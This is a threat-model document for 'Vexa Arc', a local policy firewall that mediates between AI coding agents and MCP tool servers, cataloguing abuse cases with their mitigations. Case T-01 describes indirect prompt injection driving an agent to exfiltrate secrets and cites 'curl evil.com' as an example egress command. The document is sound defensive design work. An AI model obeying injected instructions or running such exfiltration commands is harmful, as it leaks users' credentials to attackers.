# Vexa Arc Threat Model & Abuse Cases

**Document Version:** 1.0.0  
**Baseline Date:** 2026-10-23  
**Standard:** Meets NFR-SEC-002 (PRD v5.0)

---

## 1. System Overview & Trust Boundaries

Vexa Arc (`arc`) acts as a local, deterministic security control and pre-execution firewall for AI-assisted engineering workflows. It mediates interactions between:
1. **Agent Hosts** (e.g. Claude Code, Cursor, Windsurf, generic MCP clients)
2. **MCP Tool Servers** (e.g. filesystem, git, slack, bash execution)
3. **Local File System & Environment** (`.env`, `.ssh`, source code, shell interpreters)
4. **External Registries & APIs** (npm, PyPI, Cargo, web endpoints)

### Core Trust Boundaries

```
[ UNTRUSTED EXTERNAL CONTEXT ]
  (Web pages, PR comments, issue trackers, hallucinated packages)
             │
             ▼
  ┌────────────────────────┐
  │  AI Coding Agent Host  │ (Semi-trusted: subject to prompt injection)
  └──────────┬─────────────┘
             │ JSON-RPC (stdio)
  ═══════════╪══════════════════════════════════════════════════════════ [TRUST BOUNDARY: ARC ENFORCEMENT EDGE]
             ▼
  ┌────────────────────────┐
  │  Vexa Arc Stdio Broker │
  │  - Policy Evaluator    │ (Trusted Local Control: Deterministic Rust)
  │  - Causal Taint DAG    │
  │  - DLP & Secret Vault  │
  └──────────┬─────────────┘
             │ Evaluated & Sanitized JSON-RPC
  ═══════════╪══════════════════════════════════════════════════════════ [CONTROLLED BOUNDARY]
             ▼
  ┌────────────────────────┐
  │    MCP Tool Server     │ (Potentially Malicious / Vulnerable to Drift)
  └────────────────────────┘
```

---

## 2. Threat Catalog & Abuse Cases

### T-01: Lethal Trifecta (Indirect Prompt Injection $\to$ Context Exfiltration)
- **Threat:** An agent reads confidential local context (`.env`, AWS keys), ingests untrusted text containing indirect injection instructions from an external issue or web crawl, and attempts to execute an outbound egress or destructive action (`slack_post_message`, `curl evil.com`).
- **Mitigation:** Arc tracks session data-flow in a monotonic **Causal Taint Graph**. When `PRIVATE_DATA` + `UNTRUSTED_CONTENT` converge on a sensitive sink (`EXTERNAL_EGRESS`, `DESTRUCTIVE`), rule `ARC-LTT-001` blocks the action before execution.

### T-02: Dynamic Schema Rug-Pull (Post-Approval Tool Escalation)
- **Threat:** An MCP server declares benign tools during initial configuration (`tools/list`), but dynamically updates tool descriptions, arguments, or schemas mid-session to escalate capabilities.
- **Mitigation:** Arc captures runtime schemas from `tools/list` responses, computes an RFC 8785 JSON Canonicalization Scheme (JCS) SHA-256 fingerprint, and isolates baselines per session. Unexpected mutations mid-session trigger immediate quarantine (`ARC-RUG-001`).

### T-03: Provenance Spoofing
- **Threat:** An attacker or compromised agent passes arbitrary flags or metadata claiming an untrusted payload is `UserExplicit`.
- **Mitigation:** Arc models provenance through authenticated adapter contracts (`AuthenticatedProvenance`). Untrusted content ingested from remote origins cannot be cleared to `UserExplicit` without authenticated operator authorization.

### T-04: Credential & Secret Exfiltration Across Protected Boundaries
- **Threat:** Sensitive tokens (AWS, GitHub PATs, OpenAI keys, SSH private keys) are embedded in prompt submissions, tool arguments, or shell commands.
- **Mitigation:** The DLP engine scans payloads across the protected boundary, computes exact byte-level spans, and replaces secrets with local pseudonymization tokens (`<ARC_SECRET:detector>`) before bytes are forwarded to external servers.

### T-05: AI Slopsquatting & Dependency Hallucination
- **Threat:** Generative models hallucinate non-existent package names or slight typosquats (`reactt`, `collor`), which attackers pre-register with malicious `preinstall`/`postinstall` scripts.
- **Mitigation:** `arc shield` implements a 4-gate compound defense analyzing package age, monthly download thresholds, typosquat string distance, and dangerous lifecycle script detection.

### T-06: Local State & Policy Tampering
- **Threat:** Multiple concurrent agent processes race to corrupt session files, or an attacker attempts to downgrade policy settings.
- **Mitigation:**
  - Policy precedence is enforced: BuiltInDefault < ProjectLocal < UserGlobal < SignedOrganization < EmergencyDeny. Emergency deny rules cannot be overridden by project-local configuration.
  - Multi-process safety is guaranteed via cross-platform file locking (`SessionLock`).
  - File persistence is atomic (write to temporary UUID file + atomic rename).

### T-07: Telemetry & Payload Leakage
- **Threat:** Sensitive source code, developer prompts, or secrets are transmitted to external servers under the guise of telemetry.
- **Mitigation:** Arc operates under a **Zero Egress Invariant**. All discovery, audit, taint tracking, and DLP occurs locally in-process. Telemetry is disabled by default, and log messages redact all secret values.

---

## 3. Explicit Limitations & Boundaries

1. **Same-User Local Privilege Limit:** An attacker with equal or higher OS-level privileges (e.g. administrator/root) can modify local disk binaries or kill processes. Arc defends against untrusted code and agent-mediated workflows running under normal user privileges.
2. **Kernel EDR:** Arc does not hook OS system calls at the kernel level; it operates at the agent runtime and MCP JSON-RPC protocol boundary.
